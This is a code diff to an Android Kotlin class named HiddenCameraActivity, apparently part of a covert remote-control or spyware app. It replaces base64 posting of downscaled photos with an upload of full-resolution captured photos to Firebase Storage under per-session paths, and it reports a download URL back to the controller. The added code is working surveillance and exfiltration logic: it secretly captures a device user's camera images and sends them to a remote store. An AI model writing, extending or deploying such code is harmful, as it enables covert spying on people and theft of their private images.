@@ -15,6 +15,7 @@ import android.util.Base64
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.storage.FirebaseStorage
 import java.nio.ByteBuffer
 
 class HiddenCameraActivity : Activity() {
@@ -86,30 +87,25 @@ class HiddenCameraActivity : Activity() {
                         val bytes = ByteArray(buffer.capacity())
                         buffer.get(bytes)
 
-                    // Downscale and compress to ensure it fits in Firebase limits
-                    val options = android.graphics.BitmapFactory.Options()
-                    options.inJustDecodeBounds = true
-                    android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size, options)
+                        val currentSession = sessionKey
+                        if (currentSession == null) {
+                            postResult("ERROR", "Session key missing.", "CAPTURE_PHOTO")
+                            return@setOnImageAvailableListener
+                        }
 
-                    val maxDim = 800
-                    var scale = 1
-                    if (options.outHeight > maxDim || options.outWidth > maxDim) {
-                        scale = Math.pow(2.0, Math.ceil(Math.log(Math.max(options.outHeight, options.outWidth).toDouble() / maxDim) / Math.log(0.5)).toInt() * -1.0).toInt()
-                    }
+                        val storageRef = FirebaseStorage.getInstance().reference
+                        val storagePath = "sessions/$currentSession/files/${System.currentTimeMillis()}_photo.jpg"
+                        val fileRef = storageRef.child(storagePath)
 
-                    options.inJustDecodeBounds = false
-                    options.inSampleSize = scale
-                    val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size, options)
-
-                    if (bitmap != null) {
-                        val outputStream = java.io.ByteArrayOutputStream()
-                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, outputStream)
-                        val compressedBytes = outputStream.toByteArray()
-                        val base64 = Base64.encodeToString(compressedBytes, Base64.NO_WRAP)
-                        postResult("IMAGE", base64, "CAPTURE_PHOTO")
-                    } else {
-                        postResult("ERROR", "Failed to decode captured image.", "CAPTURE_PHOTO")
-                    }
+                        fileRef.putBytes(bytes).addOnSuccessListener {
+                            fileRef.downloadUrl.addOnSuccessListener { uri ->
+                                postResult("IMAGE", "${uri.toString()}|$storagePath", "CAPTURE_PHOTO")
+                            }.addOnFailureListener {
+                                postResult("ERROR", "Failed to get download URL for captured photo.", "CAPTURE_PHOTO")
+                            }
+                        }.addOnFailureListener {
+                            postResult("ERROR", "Failed to upload captured photo: ${it.message}", "CAPTURE_PHOTO")
+                        }
                     } catch (e: Exception) {
                         postResult("ERROR", "Failed to process image: ${e.message}", "CAPTURE_PHOTO")
                     } finally {
